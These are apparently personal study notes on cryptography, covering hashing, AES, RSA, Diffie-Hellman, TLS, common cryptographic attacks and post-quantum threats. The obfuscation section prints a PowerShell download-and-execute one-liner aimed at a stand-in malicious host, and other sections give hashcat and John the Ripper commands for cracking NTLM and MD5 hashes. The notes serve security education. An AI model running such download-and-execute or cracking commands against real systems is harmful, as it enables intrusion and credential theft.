Original Notes

Cryptography

What is Cryptography?

The science of protecting information so adversaries can’t read or alter it.

Goals :

  • Confidentiality → keep data secret.
  • Integrity → detect unauthorized changes.
  • Authenticity → confirm identity.
  • Availability → ensure access when needed.

Everyday use:

  • Login credentials encrypted when sent over the internet.
  • SSH tunnels prevent eavesdropping.
  • Browsers check certificates before online banking.
  • File downloads verified with hashes (sha256sum).

Standards:

  • PCI DSS → payment data must be encrypted at rest and in transit.
  • HIPAA / GDPR / HITECH → protect medical and personal data.

Key Terms

  • Plaintext → readable data.
  • Ciphertext → encrypted unreadable data.
  • Cipher → algorithm for encryption/decryption.
  • Key → secret (or public/private) value that controls the cipher.
  • Encryption → plaintext → ciphertext.
  • Decryption → ciphertext → plaintext.

Encoding vs Encryption vs Hashing

  • Encoding → just a format change, reversible.
    • Example: "hello" → Base64 → aGVsbG8=
  • Encryption → uses a key to protect confidentiality.
    • Example: AES with key "secret" → "hello" → U2Fsd...
  • Hashing → one-way digest for integrity/authentication.
    • Example: SHA256("hello") → 2cf24d...

Historical Ciphers

  • Caesar Cipher → shifts letters by a set key. "OMAR_AMIR" +3 → "RPDUD_DPLU".
  • Weak since it has only 25 possible keys.
  • Other examples: Vigenère cipher, Enigma machine, one-time pad.

Mathematical Building Blocks

  • XOR (⊕): 1⊕1=0, 1⊕0=1.
    • Used in block and stream ciphers.
    • Example: 1010 ⊕ 1100 = 0110.
  • Modulo (mod): remainder operation.
    • Example: 23 mod 7 = 2.
    • Foundation of RSA and Diffie-Hellman.

Hashing

  • One-way function → any input produces a fixed-size digest.
  • Not reversible, small input change = large digest change.
  • Used for passwords, file integrity, and digital signatures.

Examples:

bash
echo -n "hello" | md5sum
# 5d41402abc4b2a76b9719d911017c592

echo -n "hello" | sha256sum
# 2cf24dba5fb0a30e26e83b2ac5b9e29e...

Password Hashing:

  • Linux → /etc/shadow stores $algorithm$salt$hash.
  • Windows → NTLM hashes stored in the SAM database.

Collisions:

  • Two inputs produce the same hash.
  • MD5 and SHA1 broken → use SHA-2 or SHA-3.

Cracking:

  • Hashes are cracked, not decrypted.
bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt   # NTLM
john --format=raw-md5 --wordlist=rockyou.txt hash.txt

Integrity Checking:

bash
sha256sum file.iso   # compare with official checksum

Symmetric Cryptography

  • One key for both encryption and decryption.
  • Also called secret-key cryptography.

Algorithms:

  • DES (broken), 3DES (deprecated), AES (current standard).

Challenge: securely sharing the key.

Example:

bash
openssl enc -aes-256-cbc -in secret.txt -out secret.enc -k mypassword
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -k mypassword

Asymmetric Cryptography

  • Uses two keys: public (encrypt) and private (decrypt).
  • Slower, but solves the key distribution problem.

Algorithms: RSA, ECC, Diffie-Hellman.

  • RSA → 2048–4096 bit keys.
  • ECC → shorter keys, same security (256-bit ECC ≈ 3072-bit RSA).

Example:

bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
openssl rsautl -encrypt -inkey public.pem -pubin -in secret.txt -out secret.enc
openssl rsautl -decrypt -inkey private.pem -in secret.enc -out secret.txt

Diffie-Hellman Key Exchange

  • Lets two parties agree on a shared key over an insecure channel.
  • Example with small numbers:
    • p=23, g=5
    • Alice private=6 → A=8
    • Bob private=15 → B=19
    • Shared secret = 2

Public Key Infrastructure (PKI)

  • Trust framework using certificates issued by Certificate Authorities (CA).
  • Certificates follow the X.509 format.

Contents: Subject, Issuer, Public Key, Validity, Signature.

SSL/TLS

  • Protocol securing web and email communication.

Steps:

  1. Client requests certificate.
  2. Server sends X.509 certificate.
  3. Client verifies it.
  4. Key exchange (RSA/DH/ECDHE).
  5. Secure channel with symmetric AES.

Why mix both?

  • Asymmetric for handshake, symmetric for fast encryption.

Examples:

bash
openssl s_client -connect example.com:443
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem

Obfuscation

  • Makes code/data harder to read but not encrypted.
  • Used in malware and to hide sensitive scripts.

Obfuscation Examples

1- Instead of writing:

powershell
IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

Attackers might obfuscate it like:

powershell
I`E`X(Ne`w-Ob`je`ct Net.WebClient).Down`loadStr`ing('hxxp://malicious[.]com/payload.ps1')

2- Original PowerShell command:

powershell
Get-Process

Obfuscated as Base64 encoded string:

powershell
powershell.exe -EncodedCommand R2V0LVByb2Nlc3M=

When decoded, it runs the same Get-Process.

Cryptographic Attacks

  • Brute Force Attacks
    • Trying every possible key or password until the correct one is found.
    • Tools: John the Ripper, Hashcat, Hydra.
    • Example: Cracking an NTLM hash using Hashcat with rockyou.txt.
  • Dictionary Attacks
    • Use a list of common passwords instead of trying all possible ones.
    • Faster than pure brute force.
  • Rainbow Table Attacks
    • Precomputed hash databases used to reverse hashes quickly.
    • Defeated by salting.
    • Example tool: Ophcrack (used to crack Windows password hashes with rainbow tables).
  • Man-in-the-Middle (MITM)
    • Attacker intercepts and modifies communication between two parties.
    • Tools: Ettercap, Bettercap, Wireshark.
    • Example: Capturing unencrypted HTTP credentials on a public Wi-Fi.
  • Replay Attacks
    • Intercepting and re-sending valid messages to trick systems.
    • Example: Resending a captured authentication token to gain access.
    • Defense: use timestamps and nonces in authentication protocols.
  • Side-Channel Attacks
    • Exploiting physical characteristics (power use, timing, EM leaks).
    • Example: Measuring decryption time to guess RSA private key.
    • Mitigation: constant-time algorithms and hardware protections.
  • Chosen-Plaintext / Chosen-Ciphertext Attacks
    • Attacker manipulates input to analyze output and learn the key.
    • Example: Padding Oracle Attack on poorly implemented AES.

HMAC (Hash-Based Message Authentication Code)

  • Combines hashing with a secret key.
  • Ensures integrity + authenticity.
  • Used in APIs, JWT, TLS.

Formula:

HMAC(K, M) = H((K⊕opad) || H((K⊕ipad) || M))

Blockchain

  • Distributed ledger linked with cryptographic hashes.
  • Digital signatures ensure authenticity.
  • Used in cryptocurrency, smart contracts, immutable logs.

Quantum Computing & Cryptography

Quantum computing introduces new risks to current cryptographic systems because it can solve problems much faster than classical computers.

  • Threats
    • RSA and ECC rely on problems like prime factorization and discrete logarithms. These are hard for classical computers but solvable efficiently with Shor’s algorithm on a quantum computer. This means widely used protocols (SSL/TLS, PGP, SSH) could be broken.
    • Symmetric encryption (AES) and hashing algorithms (SHA-2/3) are less affected, but Grover’s algorithm can speed up brute force attacks.
      • AES-128 would effectively be reduced to ~64-bit security.
      • AES-256 is still considered safe for the near future.
  • Defenses
    • Post-Quantum Cryptography (PQC): algorithms designed to resist quantum attacks. Examples: lattice-based (CRYSTALS-Kyber, Dilithium), hash-based (SPHINCS+), and code-based (Classic McEliece).
    • Quantum Key Distribution (QKD): uses quantum physics to exchange keys securely. Any eavesdropping changes the quantum state, making the interception detectable.
  • Current Status
    • No practical quantum computer yet that can break RSA/ECC at real-world key sizes.
    • NIST is standardizing post-quantum algorithms, expected to replace RSA/ECC in the coming years.
